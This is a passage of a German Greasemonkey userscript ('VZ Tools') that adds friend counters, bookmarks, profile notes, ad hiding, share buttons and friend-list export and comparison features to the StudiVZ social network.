  var pictureicon = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QMFFDkPDI/2IgAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAE9SURBVHjaXZHPLkNBFMZ/c13VptEKwoYgEisrryPxHN7AQsLCwguIWLC0s7HrQkNI/EtYaEJCkIqqtu6Mb+ZOLdzJnHMz8zvf+WbGwOrd4qixDofVRNFnazBnze1ZAztumXsy+p8JA2bYZcWkULT1ZJMphkiEtfnkgyZvrGkHUi/ZZZ6lAPS0/coTj8rtoCfAKYxpDEjYUqKg+C0kDY4CgJZHGFbuaKtHRaMsvaiAfiuqm1STS66oMyE4N0qOGZ7Z4lh5g0N13+OB8wiknklYV89ryZ/qHBk30mrE6tTXd3jX8hE19e8GT7Vg+M9kiTlaOsWPJppOYEk+XnLgiwUOtGhCBeGy/cVPc0G8KBiPr+Bj/iZWTV3fQ6YG/4GMYv8UaVKOtItNvGZGlcEkALeN/Wo3sxFw0YGjkJy04BcyzH/zrTmCAwAAAABJRU5ErkJggg==';

	var topbar = document.createElement('ul');
	topbar.setAttribute('id', 'vz_overview');
	addGlobalStyle('ul#vz_overview {margin-top: 8px; list-style-type: none; padding-left: 0px; margin-left: 0px;}');
	if (siteName.indexOf('studi') > -1) {
	  addGlobalStyle('#vz_overview li {border-bottom: 1px solid #ffa0a0;}');
	}else{
	  addGlobalStyle('#vz_overview li {padding-bottom: 2px; padding-top: 2px; border-bottom: 1px solid #ffcdaa;}');
	}
	var html =  '<li><img src="'+friendsicon+'" valign="absmiddle" /> <span id="numfriends" title="Anzahl Deiner Freunde"></span> <a href="/Friends/All">Freunde</a></li>';
	    html += '<li><img src="'+onlineicon+'" valign="absmiddle" /> <span id="numfriendsonline" title="Freunde online"></span> <a href="/Friends/Friends/'+profId+'/online/1">online</a></li>';
	    if (GM_getValue(s_prefix + 'f_guestbook',1) == 1) {
	      if (GM_getValue(s_prefix + 'f_gb_last_author', 0) == 1) {
			    html += '<li onMouseOver="document.getElementById(\'lastguestbookd\').style.display = \'block\';" onMouseOut="document.getElementById(\'lastguestbookd\').style.display = \'none\';"><img src="'+gbicon+'" valign="absmiddle" /> <span id="numguestbook" title="Anzahl Pinnwandeinträge"></span> <a href="/Pinboard/'+profId+'/p/1">auf Pinnwand</a></li>';
			  }else{
			    html += '<li ><img src="'+gbicon+'" valign="absmiddle" /> <span id="numguestbook" title="Anzahl Pinnwandeinträge"></span> <a href="/Pinboard/'+profId+'/p/1">auf Pinnwand</a></li>';
			  }
			  getNumberOfGuestbook(false);
			}
			if (GM_getValue(s_prefix + 'f_pictures',1) == 1) {
			  html += '<li><img src="'+pictureicon+'" valign="absmiddle" /> <span id="numpictures" title="Anzahl der Bild-Verlinkungen"></span> <a href="/Photos/Tags/'+profId+'/">Verlinkungen</li>';
			  getNumberOfPictures(false);
			}
			html += '</ul>';
			html += '<div id="lastguestbookd" style="margin-top: 10px; display: none;">Der letzte Eintrag stammt von <span id="lastguestbook"></span></div>';
	topbar.innerHTML = html;
	document.getElementById('Grid-Navigation-Main').childNodes[5].wrappedJSObject.style.display = 'none';
	if (GM_getValue(s_prefix + 'u_position', 0) == 0) {
	  document.getElementById('Grid-Page-Left').insertBefore(topbar, document.getElementById('Grid-Navigation-Main'));
	}else{
	  document.getElementById('Grid-Page-Left').insertBefore(topbar, document.getElementById('LeftsideBox'));
	}
}

// Anzahl Pinnwandeinträge zählen
getNumberOfGuestbook = function(update) {
  GM_xmlhttpRequest({
   method:"GET",
   url: url + "/Pinboard/"+profId+"/p/1",
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var gb = document.createElement('div');
     gb.innerHTML = response.responseText;
     var gbi = trim(gb.getElementsByClassName('obj-pagecounter')[0].wrappedJSObject.innerHTML);
     var numgb = gbi.split(" ")[5];
     
     if (!update) {
       if (document.getElementById('numguestbook')) {
         document.getElementById('numguestbook').innerHTML = numgb;
       }
     
       var gbl = gb.getElementsByClassName('comment-metainfo')[0].wrappedJSObject.getElementsByClassName('profile')[0];
       var gbu = gb.getElementsByClassName('comment-metainfo')[0].wrappedJSObject.getElementsByClassName('profile')[0].innerHTML;
       if (document.getElementById('lastguestbook')) {
         document.getElementById('lastguestbook').innerHTML = '<a href="'+gbl+'">'+gbu+'</a>';
       }
     
       // Neue Einträge?
       if (numgb > GM_getValue(s_prefix + 'num_guestbook', 0)) {
         document.getElementById('numng').innerHTML = (numgb - GM_getValue(s_prefix + 'num_guestbook', 0));
         document.getElementById('newguestbook').style.display = 'block';
       }
    }else{
      GM_setValue(s_prefix + 'num_guestbook', numgb);  
     }
   }
   });
}

// Bildverlinkungen zählen
getNumberOfPictures = function(update) {
  GM_xmlhttpRequest({
   method:"GET",
   url: url + "/Photos/Tags/"+profId,
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var gb = document.createElement('div');
     gb.innerHTML = response.responseText;
     var gbi = trim(gb.getElementsByClassName('info')[0].wrappedJSObject.innerHTML);
     var numgb = gbi.split(" ")[3];
     
     if (!update) {
       if (document.getElementById('numpictures')) {
         document.getElementById('numpictures').innerHTML = numgb;
       }
     
       // Neue Einträge?
       if (numgb > GM_getValue(s_prefix + 'num_pictures', 0)) {
         document.getElementById('numnp').innerHTML = (numgb - GM_getValue(s_prefix + 'num_pictures', 0));
         document.getElementById('newpictures').style.display = 'block';
       }
    }else{
      GM_setValue(s_prefix + 'num_pictures', numgb);  
     }
   }
   });
}

// == ENDE Überblick und Benachrichrtigungen ==

// == BEGINN Usability ==

// Share-Links
if (GM_getValue(s_prefix + 'add_share', 1) == 1) {
  if (!document.getElementById('PhotoContainer')) {
    var div = document.createElement('div');
    
    var script =  "var addthis_share = {";
        script += "url: '"+window.location.href+"',";
        script += "title: '"+document.title+"',";
        script += "};";
        script += "var addthis_config = {";
        script += "username: 'hschaefer',";
        script += "ui_cobrand: 'VZ Tools'";
        script += "};";

    var content =  '<div class="addthis_toolbox addthis_default_style" style="margin-top: 2px;">';
        content += '<a class="addthis_button_facebook"></a>';
  			content += '<a class="addthis_button_myspace"></a>';
  			content += '<a class="addthis_button_twitter"></a>';
  			content += '<a href="http://www.addthis.com/bookmark.php?v=250" class="addthis_button_compact">mehr</a>';
  			content += '</div>';

    div.innerHTML = '<script type="text/javascript">'+script+'</script><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js?pub=hschaefer"></script>' + content;
    document.getElementById('Grid-Navigation-Main').wrappedJSObject.appendChild(div);
  }else{
    var div = document.createElement('div');
    
    var url = document.getElementById('PhotoContainer').getElementsByTagName('img')[0].src;
    var title = trim(document.getElementsByClassName('photo-metainfo')[0].getElementsByTagName('td')[0].innerHTML);
    
    var script =  "var addthis_share = {";
        script += "url: '"+url+"',";
        script += "title: '"+title+"',";
        script += "};";
        script += "var addthis_config = {";
        script += "username: 'hschaefer',";
        script += "ui_cobrand: 'VZ Tools'";
        script += "};";

    var content =  '<div class="addthis_toolbox addthis_default_style" style="position: absolute; right: 0px;">';
        content += '<a class="addthis_button_facebook"></a>';
  			content += '<a class="addthis_button_myspace"></a>';
  			content += '<a class="addthis_button_twitter"></a>';
  			content += '<a href="http://www.addthis.com/bookmark.php?v=250" class="addthis_button_compact">mehr</a>';
  			content += '</div>';
  			addGlobalStyle('.photo-tagging {position: relative;}');
        div.innerHTML = '<script type="text/javascript">'+script+'</script><script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js?pub=hschaefer"></script>' + content;
        document.getElementsByClassName('photo-tagging')[0].appendChild(div);
  }
}


// Zusätzlicher Logout-Link
function additionalLogoutLink() {
	var li_tag = document.createElement("li");
	var a_tag = document.createElement("a");
	a_tag.setAttribute('href', '/Logout');
	var logout_text = document.createTextNode("Raus hier");
	a_tag.appendChild(logout_text);
	li_tag.appendChild(a_tag);
	document.getElementById('Grid-Navigation-Main').wrappedJSObject.appendChild(li_tag);
}

// Bilder abspeichern ermöglichen
function allowSavePics() {
  var images = document.evaluate("//img[@oncontextmenu and contains(@src, 'imagevz.net')]", document, null, 6, null), img, i=0;
  while (img = images.snapshotItem(i++)) {
	  img.removeAttribute("oncontextmenu");
  }  
}

// == ENDE Usability ==

// == BEGINN Bookmarks und Notizen ==

// Startseite Bookmarks und Notizen
function showBookmarksAndNotes() {
  var nb = document.createElement('div');
  nb.setAttribute('id','notesandbookmarks');
  nb.setAttribute('class','text');
  nb.setAttribute('style','padding-left: 160px;');
  document.getElementById('startLeft').appendChild(nb);
  var content = "";
  if (GM_getValue(s_prefix + 'notes', "") == "") {
    content = "Derzeit hast Du keine Notizen gespeichert.";
  }else{
    content = "<table width='100%' cellspacing='0'>";
    var list = GM_getValue(s_prefix + 'notes', "").split('|');
    for (var n = 0; n < list.length; n++) {
      var user = list[n].split('+$+');
      if (user[1]) {
        content += "<tr><td valign='top' style='border-bottom: 1px solid #C0C0C0;'><b><nobr><a href='"+url+"/Profile/"+user[0]+"/'>"+user[1]+"</a>:</nobr></b></td>";
        content += "<td valign='top' style='border-bottom: 1px solid #C0C0C0;'>"+GM_getValue(s_prefix + 'note_'+user[0], "")+"</td></tr>";
      }
    }
    content += "</table>";
  }
  nb.innerHTML += "<h2>Deine Notizen zu anderen Benutzern</h2>"+content+"<br /><br />";
}

// Bookmarks anzeigen
function addBookmarks() {
  var bookmarks = document.createElement('div');
  var list = GM_listValues();
  addGlobalStyle('#bookmarks {margin-top: 2px; height: 22px; width: 100%;}');
  var content = '<select id="bookmarks" size="1">';
  content += "<option value='' selected>-- Bookmarks --</option>";
  var bookmarks_available = false;
  for (var i = 0; i < list.length; i++) {
    if (list[i].indexOf(s_prefix + 'bkm_') > -1) {
      var target = list[i].split('bkm_')[1];
      content += "<option value='"+target+"'>"+GM_getValue(list[i], '')+"</option>";
      bookmarks_available = true;
    }
  }
  content += '</select>';
  bookmarks.innerHTML = content;
  if (bookmarks_available) {
    document.getElementById('configbar').appendChild(bookmarks);
    document.getElementById('configbar').addEventListener("change", function(e) {
      if (e.target.value != "") {
       if (GM_getValue(s_prefix + 'bookmark_tabs', 0) == 1) {
         GM_openInTab(e.target.value);
       }else{
	       window.location.href = e.target.value;
	     }
	    }
    }, true);
  }
}

// Bookmark umschalten
function toggleBookmark() {
  var lloc = window.location.href.split('tid');
  var loc = lloc[0];
  if (GM_getValue(s_prefix + 'bkm_'+loc, '') == '') {
    var title = trim(document.title.split('|')[1]);
    GM_setValue(s_prefix + 'bkm_'+loc, title);
  }else{
    GM_deleteValue(s_prefix + 'bkm_'+loc);
  }
  updateBookmark();
}

// Bookmark-Icon updaten
function updateBookmark() {
  var lloc = window.location.href.split('tid');
  var loc = lloc[0];
  if (GM_getValue(s_prefix + 'bkm_'+loc, '') != '') {
    document.getElementById('t_bookmark').src = icon_bookmark;
    document.getElementById('t_bookmark').setAttribute('title', 'Diese Seite aus den Bookmarks entfernen.');
  }else{
    document.getElementById('t_bookmark').src = icon_nobookmark;
    document.getElementById('t_bookmark').setAttribute('title', 'Diese Seite zu den Bookmarks hinzufügen.');
  }
}

// Notizfunktion im Profil
function addNotes() {
  if ((window.location.href.indexOf('Profile') > -1) && (window.location.href.indexOf('hidemb') == -1)){
    var name = document.getElementById('Mod-Profile-Information-Account').getElementsByTagName('dd')[0].innerHTML;
    name = name.replace(/\s+$/,"").replace(/^\s+/,"");
    var id = window.location.href.substr(window.location.href.indexOf('Profile') + 8,16);
    var notes = document.createElement('div');
    notes.setAttribute('style','margin-bottom: 10px;');
    document.getElementById('profileRight').insertBefore(notes, document.getElementById('profileRight').firstChild);
    notes.innerHTML = '<h2><a "javascript:void(null)" id="toggle_notes" style="float: right; cursor: pointer; text-decoration: none;">&uarr;&darr;</a>Notizen</h2>';
    notes.innerHTML += "<div id='note' style='display: none; padding-top: 10px;'></div>";
    var note = document.getElementById('note');
    var content = GM_getValue(s_prefix + 'note_'+id, "");
    note.innerHTML = 'Deine Notiz zu <b>'+name+'</b>:<br /><textarea id="note_text" style="width: 372px; height:50px; margin-top: 5px; margin-bottom: 5px;">'+content+'</textarea>';
    note.innerHTML += "<center><a href='javascript:void(null)' id='save_note'>[Speichern]</a></center>";
    document.getElementById('toggle_notes').addEventListener("click", toggleNotes, false);
    document.getElementById('save_note').addEventListener("click", saveNote, false);
    if (content != "") {
      document.getElementById('note').style.display = 'block';
    }
  }
}

// Hilfsfunktion zur String-Manipulation
function remove(s, t) {
  i = s.indexOf(t);
  r = "";
  if (i == -1) return s;
  r += s.substring(0,i) + remove(s.substring(i + t.length), t);
  return r;
  }

// User von der Notizliste entfernen
function removeFromNotesList(id) {
  GM_setValue(s_prefix + 'notes', remove(GM_getValue(s_prefix + 'notes', ""), id + '|'));
  
}

// User zur Notizliste hinzufügen
function addToNotesList(id) {
  GM_setValue(s_prefix + 'notes', GM_getValue(s_prefix + 'notes', "") + id + '|');
}

// Notiz abspeichern
saveNote = function() {
  var name = document.getElementById('Mod-Profile-Information-Account').getElementsByTagName('dd')[0].innerHTML;
  name = name.replace(/\s+$/,"").replace(/^\s+/,"");
  var id = window.location.href.substr(window.location.href.indexOf('Profile') + 8,16);
  if (document.getElementById('note_text').value == "") {
    alert('Deine Notiz zu '+name+' wurde gelöscht');
    GM_setValue(s_prefix + 'note_'+id, "");
    removeFromNotesList(id + '+$+' + name);
  }else{
    alert('Deine Notiz zu '+name+' wurde aktualisiert');
    GM_setValue(s_prefix + 'note_'+id, document.getElementById('note_text').value);
    if (GM_getValue(s_prefix + 'notes', "").indexOf(id + '+$+' + name) > -1) {
    }else{
      addToNotesList(id + '+$+' + name);
    }
  }
  
}

// Defekte Notizen entfernen
removeEmptyNotes = function() {
   var i = 0;
   var list = GM_getValue(s_prefix + 'notes', "").split('|');
    for (var n = 0; n < list.length; n++) {
      var user = list[n].split('+$+');
      if ((user[0] != "") && (GM_getValue(s_prefix + 'note_'+user[0], "") == "")) {
        removeFromNotesList(user[0] + '+$+' + user[1]);
        i++;
      }
    }
  alert(i + ' als defekt erkannte Notizen wurden entfernt.');
}

// Notizen aus-/einklappen
toggleNotes = function() {
  if (document.getElementById('note').style.display == 'none') {
    document.getElementById('note').style.display = 'block';
  }else{
    document.getElementById('note').style.display = 'none';
  }
}

// == ENDE Bookmarks und Notizen ==

// == BEGINN Startseite und Werbung ==

// Letzte Profilbesucher austauschen
function swapVisitors() {
  if (document.getElementById('Visitors').getElementsByClassName('obj-thumbnaillist')[0]) {
    var content = document.getElementById('Visitors').getElementsByClassName('obj-thumbnaillist')[0].wrappedJSObject.innerHTML;
    if (GM_getValue(s_prefix + 'toggle_kds', 0) == 1) {
      var toggle = document.createElement('div');
      toggle.style.textAlign='center';
      toggle.style.padding = '10px';
      toggle.innerHTML = '<a id="show_visitors" style="cursor: pointer;">Letzte Besucher...</a>';
      document.getElementById('Mod-Kdk-Snipplet').appendChild(toggle);
      document.getElementById('show_visitors').addEventListener('click', showVisitors, true);
    }else{
      addGlobalStyle('#Kds #container {display: none !important;}');
      document.getElementById('KdsList').innerHTML = content;
      document.getElementById('Mod-Kdk-Snipplet').getElementsByTagName('h2')[0].innerHTML = 'Letzte Besucher';
      var counter = document.getElementsByClassName('visitorsCounter')[0].innerHTML;
      var nt = document.createElement('p');
      nt.innerHTML = counter + '<br /><br /><a href="'+url+'Visitors/LongList/">mehr Besucher...</a><br /><br /><a id="showKds" style="cursor: pointer;">Kennst Du schon...?</a>';
      nt.style.textAlign = 'center';
      document.getElementById('Kds').appendChild(nt);
      addGlobalStyle('#KdsList li {text-align: center !important ; width: 100% !important;}');
      document.getElementById('showKds').addEventListener('click', showKds, true);
    }
    document.getElementById('Visitors').parentNode.removeChild(document.getElementById('Visitors'));
  }
}

// Zur KDS-Ansicht wechseln
showKds = function() {
  GM_setValue(s_prefix + 'toggle_kds', 1);
  window.location.href='/Start/switch/1';
}

// Zur Letzte-Besucher-Ansicht wechseln
showVisitors = function() {
  GM_setValue(s_prefix + 'toggle_kds', 0);
  window.location.href='/Start';
}

// Nervtötende Werbung weg:
function removeMainAds() {
    if (document.getElementById('Grid-Advertising-Top')) {
      //document.getElementById('Grid-Advertising-Top').innerHTML = "";
      document.getElementById('Grid-Advertising-Top').style.display = "none";
    }
    if (document.getElementById('Grid-Advertising-Right')) {
      //document.getElementById('Grid-Advertising-Right').innerHTML = "";
      document.getElementById('Grid-Advertising-Right').style.display = "none";
    }
}

// == ENDE Startseite und Werbung ==

// == BEGINN Freundeslisten-Export ==

var index = 1;
var results = "";
var hashes = "";

// Laden der Freundesliste
loadFriendsRecursive = function(wnd, page) {
  GM_xmlhttpRequest({
   method:"GET",
   url: url + "Friends/Friends/"+profId+"/p/"+page,
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var friends = document.createElement('div');
	     friends.innerHTML = response.responseText;
	     friends = friends.getElementsByTagName('tbody')[0];
	   if (friends) {
	     var tags = friends.getElementsByTagName('tr');
	     var nodes = [];
	     for (var n = 0; n < tags.length; n++) {
	         nodes[nodes.length] = tags[n].wrappedJSObject;
	     }
     }
     // Abbruchbedingung:
     if ((!friends) || (nodes.length == 0)) {
       if (wnd) {
         wnd.location.href = 'about:blank';
         wnd.document.write("<table border='1'><tr><th>lfd. Nr.</th><th>Hash</th><th>Name</th></tr>"+results+"</table>");
         wnd.document.write("<script type='text/javascript'>alert('Fertig. Das Dokument kann nun über >>Datei/Seite speichern unter<< archiviert werden.');</script>");
       }
       GM_setValue(s_prefix + 'friendslist', hashes);
       return false;
     }
     
     for ( var i=0 ; i < nodes.length; i++ ) {
       var url = nodes[i].childNodes[1].childNodes[1].href;
       var name = nodes[i].childNodes[1].childNodes[1].childNodes[1].alt;
       var id = url.substring(url.length - 16, url.length);
       results += '<tr><td>'+index+'</td><td>'+id+'</td><td><a href="'+url+'" target="_blank">'+ name + '</a></td></tr>';
       hashes += id + '|||' + name + '§!=';
       index++;
     }
     loadFriendsRecursive(wnd, page + 1);
   }
 });
}

var differences = "";
var oldfriends = GM_getValue(s_prefix + 'friendslist', '');
var oldlist = oldfriends.split('§!=');
var lostfriends_alerted  = false;

// Unterschiede bei der Freundesliste feststellen
compareFriendsRecursive = function(page) {
  if (oldfriends == '') {
    return false;
  }
  GM_xmlhttpRequest({
   method:"GET",
   url: url + "Friends/Friends/"+profId+"/p/"+page,
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var friends = document.createElement('div');
     friends.innerHTML = response.responseText;

     friends = friends.getElementsByTagName('tbody')[0];
	   if (friends) {
	     var tags = friends.getElementsByTagName('tr');
	     var nodes = [];
	     for (var n = 0; n < tags.length; n++) {
	         nodes[nodes.length] = tags[n].wrappedJSObject;
	     }
     }
     // Abbruchbedingung:
     if ((!friends) || (nodes.length == 0)) {
       // Differenzen anzeigen
       if (lostfriends_alerted) {
         return false;
       }
       for each (var item in oldlist) {
         if (item != '') {
           differences += "<li>"+item.split('|||')[1] + "<a href='/Profile/"+item.split('|||')[0]+"/'> [Zum Profil]</a></li>";
         }
       }
       document.getElementById('friendalert').innerHTML += '<p align="left"><ul style="text-align: left;">'+differences+"</ul></p><a id='confirm_friends' href='javascript:void(null)'>[OK]</a>";
       document.getElementById('confirm_friends').addEventListener('click', removeLostFriendsAlert, true);
       lostfriends_alerted = true;
       return false;
     }
     
     for ( var i=0 ; i < nodes.length; i++ ) {
       var url = nodes[i].childNodes[1].childNodes[1].href;
       var name = nodes[i].childNodes[1].childNodes[1].childNodes[1].alt;
       var id = url.substring(url.length - 16, url.length);
       // Differenz überprüfen
       for (var j = 0; j < oldlist.length; j++) {
         var item = oldlist[j];
         if (id == item.split('|||')[0]) {
           oldlist[j] = '';
           break;
         }
       }
     }
     compareFriendsRecursive(page + 1);
   }
 });
}

// Freunde exportieren
exportFriends = function(event) {
  wnd = window.open('about:blank', '', '');
  wnd.document.write('Laden, bitte warten...');
  results = "";
  hashes = "";
  loadFriendsRecursive(wnd, 1);
}
// == ENDE Freundeslisten-Export ==

// == BEGINN Freunde zählen ==

// Anzahl der Freunde ermitteln (rekursiv)
countFriendsRecursive = function(online, page, count) {
  if (online) {
    request_url = url + "Friends/Friends/"+profId+"/online/1";
  }else{
    request_url = url + "Friends/Friends/"+profId+"/p/"+page;
  }
  GM_xmlhttpRequest({
   method:"GET",
   url: request_url,
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var friends = document.createElement('div');
     friends.innerHTML = response.responseText;
     
     friends = friends.getElementsByTagName('tbody')[0];
     if (friends) {
       var tags = friends.getElementsByTagName('tr');
	     var nodes = [];
	     var cancel = true;
	     for (var n = 0; n < tags.length; n++) {
	         count++;
	     }
	    }
     
     // Abbruchbedingung:
     if ((!friends) || (online)) {
       if (!online) {
         if (document.getElementById('numfriends')) {
           document.getElementById('numfriends').innerHTML = count;
         }
       }else{
         if (document.getElementById('numfriends')) {
           document.getElementById('numfriendsonline').innerHTML = count;
         }
       }
       return false;
     }
     countFriendsRecursive(online, page + 1, count);
   }
 });
}

// Hilfsfunktion zum Trimmen eines Strings
function trim(s) {
  return s.replace(/\s+$/,"").replace(/^\s+/,"");
}

// Anzahl der Freunde ermitteln (iterativ)
countFriends = function() {
  GM_xmlhttpRequest({
   method: "GET",
   url: url + "Friends/All/"+profId+"/1",
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var friends = document.createElement('div');
     friends.innerHTML = response.responseText;
     var temp = trim(friends.wrappedJSObject.getElementsByClassName('obj-pagertop')[0].innerHTML);
     temp = temp.substring(temp.indexOf('Du hast'), temp.length);
		 var count = temp.substring(8,temp.length - 9);
		 if (document.getElementById('numfriends')) {
       document.getElementById('numfriends').innerHTML = count;
     }
     // Neu hinzugekommene oder gelöschte Freunde?
     if (count != GM_getValue(s_prefix + 'friendscount', 0)) {
       // gelöschte Freunde?
       friendscount = count;
       if (parseInt(count) < parseInt(GM_getValue(s_prefix + 'friendscount', 0))) {
         document.getElementById('friendalert').style.display = 'block';
         var deleted = parseInt(GM_getValue(s_prefix + 'friendscount', 0)) - parseInt(count);
         document.getElementById('friendalert').innerHTML = 'Du hast ' + deleted +' gelöschte Freundschaften!';
         differences = "";
         compareFriendsRecursive(1);
       }else{
        if (!checkUsage()) {
             results = "";
             hashes = "";
             loadFriendsRecursive(false, 1);
				     storeFriendsCount();           
        }
       }
     }
   }
 });
}

getNumberOfFriends = function(online) {
  if (online) {
    countFriendsRecursive(online, 1, 0);
  }else{
    countFriends();
  }
}

// == ENDE Freunde zählen ==

// == BEGINN Freundesliste Startseite ==

var reload_icon = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAB3RJTUUH2QQGCy8q7PwAAQAAAAlwSFlzAAAewQAAHsEBw2lUUwAAAARnQU1BAACxjwv8YQUAAAHjSURBVHjaNZFPaBNBFMa/+ZftahKxTYhWGxViFKlQVOhBFGkvORT1UNCTFQv24EGFFulJRCp4U0GwKB6E4kWqFqXixQpSBP8rGEXFkhgPaRvSJHa3uzszTtf6YB58zPC+7/2GnIcGgWcO4CNAU4KNu/mFERSE0QBFWBoSkgZCEYeJRN/J7U/9o/9u+HLzbd0b741uIFQpTzVvbkf7tom7E7swzCQ34zuSN7v2ZGGtzEJoehCJodvMHeRBpvVhX5obd4b/NQ8Hm5AC2RhYXIzk0mUoRPC2Vq9Q6umW1m4h8AJ3HjtnIi5f19OCEtbgxufy8chM3Xaibfd3ZJ83pi7pq3pRgi+4U2C6QGuj8VdWyi42koF3ZboxzD86zSrFfF7peMaNQ1VuaXqArbJLlRcPNQrW4UxhJ/Xw2uWkKExmt7/zYm796I98jCk557YlT5+KrTVxSxbXYKtx7ciJfUbuTicmBfWlHTuQWmX0LN5Pk7OMXz82kEURArEQOEz3jbJwef5Nj/GX9RrqqJlFYYBj5UkJ4z/zA/ZLLnRwbgz7BzvNqve8ma+CaBqgMlt64t+y5ghMBqr40OS7bxe6M19+fc+xqhJaij9SWyF0tjekrz79fvQhvhSNjKkqXSLeMnoafvZfU2++UjhdKMcAAAAASUVORK5CYII=';

// Freundes-Überblick anzeigen
showFriendsOverview = function() {
  getNumberOfFriends(false);
  getNumberOfFriends(true);
  var friendsBox, insert;
  insert = document.getElementById("Feeds-Post-Form").parentNode.wrappedJSObject;
  
  if (GM_getValue(s_prefix + 'f_position',0) == 0) {
    document.getElementById('Feeds-Post-Form').style.display = 'none';
    insert.getElementsByTagName('h2')[0].style.display = 'none';
  }
  if (insert) {
      var prepare = '<h2 style="margin-bottom: 0px;"><div id="topsettings" style="padding-top: 2px; float: right; font-weight: normal; font-size: 7pt;"></div> Was machen Deine Freunde? <a id="refreshfriends" style="cursor: pointer;"><img id="reloader" border="0" src="'+reload_icon+'" align="absmiddle" /></a></h2>';
    if (GM_getValue(s_prefix + 'u_position', 0) == 1) {
    	 prepare += '<ul style="margin: 0px; padding: 0px;">'+
									'<li class="no-float" style="margin: 0px; padding-top: 2px; padding-bottom: 2px; border-bottom-style: solid"><div class="float-left">Freunde: <span id="numfriends"><i>zählen...</i></span></div><div class="float-right text-right"><a href="/Friends/All">alle Freunde</a></div></li>'+
									'<li class="no-float" style="margin: 0px; padding-top: 2px; padding-bottom: 2px; border-bottom-style: solid"><div class="float-left">Online: <span id="numfriendsonline"><i>zählen...</i></span></div><div class="float-right text-right"><a href="/Friends/Friends/'+profId+'/online/1">Freunde online</a></div></li>'+
									'</ul>';
		if (GM_getValue(s_prefix + 'f_guestbook',1) == 1) {
		  getNumberOfGuestbook(false);
		  prepare += '<ul style="margin: 0px; padding: 0px;">'+
		   					 '<li class="no-float" style="margin: 0px; padding-top: 2px; padding-bottom: 2px; border-bottom-style: solid;"><div class="float-left">Pinnwandeinträge: <span id="numguestbook"><i>zählen...</i></span></div>'+
								 '<div class="float-right text-right"';
		  if (GM_getValue(s_prefix + 'f_gb_last_author', 0) != 1) {
		    prepare += ' style="display: none;"';
		  }
      prepare += '>Letzter Eintrag von <span id="lastguestbook">...</span></div></li>'+
		  					 '</ul>';
		}
		if (GM_getValue(s_prefix + 'f_pictures',1) == 1) {
		  getNumberOfPictures(false);
		  prepare += '<ul style="margin: 0px; padding: 0px;">'+
		   					 '<li class="no-float" style="margin: 0px; padding-top: 2px; padding-bottom: 2px; border-bottom-style: solid;"><div class="float-left">Bildverlinkungen: <span id="numpictures"><i>zählen...</i></span></div>'+
		  					 '</ul>';
		
		}
		
		}
		
		prepare +=	'<div id="friends_details">'+GM_getValue(s_prefix + 'friends_cache', "Laden...")+'</div>';
		feed = document.createElement('div');
		feed.setAttribute('id','feedoverview');
		feed.innerHTML = prepare;
		insert.appendChild(feed);
				
    document.getElementById('refreshfriends').addEventListener('click', refreshFriends, true);
  }
}

// Ansicht aktualisieren
refreshFriends = function() {
  document.getElementById('reloader').src = icon_loading;
  getNumberOfFriends(true);
  getNumberOfFriends(false);
  getFriendsDetailsRecursive(1);
}

var friendscount;

// Anzahl der Freunde speichern
storeFriendsCount = function() {
  GM_setValue(s_prefix + 'friendscount', friendscount);
}

// Warnhinweis über gelöschte Freundschaften entfernen
removeLostFriendsAlert = function() {
  document.getElementById('friendalert').style.display = 'none';
  results = "";
  hashes = "";
  loadFriendsRecursive(false, 1);
	storeFriendsCount();
}

// Anzahl der Freunde und gespeicherte Freunde zurücksetzen
resetFriends = function() {
  GM_deleteValue(s_prefix + 'friendscount');
  GM_deleteValue(s_prefix + 'friendslist');
  GM_deleteValue(s_prefix + 'num_guestbook');
  GM_deleteValue(s_prefix + 'num_pictures');
  GM_deleteValue(s_prefix + 'friends_cache');
  alert('Die Statistiken zu Deinen Freunden und dem Gästebuch wurden zurückgesetzt');
}

// Auf vorhandene Informationen prüfen
checkUsage = function () {
  if ((GM_getValue(s_prefix + 'friendscount', 0) == 0) && (GM_getValue(s_prefix + 'friendslist', '') == '')) {
      results = "";
      hashes = "";
      loadFriendsRecursive(false, 1);
      storeFriendsCount(); 
    return true;
  }else{
    if (GM_getValue(s_prefix + 'friendslist', '') == '') {
        results = "";
        hashes = "";
        loadFriendsRecursive(false, 1);
      return true;
    }
  }
  return false;
}

// == ENDE Freundesanzeige Startseite ==

// == BEGINN Freundesdetails Startseite ==

var details = '';

var hide_icon = url + "Img/x-trans.gif";

var gfdr_count;

var a_details;

// Freundes-Details laden
getFriendsDetailsRecursive = function(page) {
  getProfileChanges();
  return false;
}

function getProfileChanges() {
  document.getElementById('reloader').src = icon_loading;
  a_details = new Array();
  details = '';
  GM_xmlhttpRequest({
   method:"GET",
   url: url + "Friends/All/"+profId+"/p/1",
   headers:{
     "User-Agent":"Mozilla/5.0",            // Recommend using navigator.userAgent when possible
     "Accept":"text/xml"
   },
   onload:function(response) {
     var friends = document.createElement('div');
     friends.innerHTML = response.responseText;
     friends = friends.getElementsByTagName('tbody')[0];
     if (friends) {
	     var tags = friends.getElementsByTagName('tr');
	     var nodes = [];
	     for (var n = 0; n < tags.length; n++) {
	         nodes[nodes.length] = tags[n].wrappedJSObject;
	     }
     }
     
     var lastact = "";
     
     for ( var i=0 ; i < nodes.length; i++ ) {
       var url = nodes[i].childNodes[1].childNodes[1].href;
       var name = nodes[i].childNodes[1].childNodes[1].childNodes[1].alt;
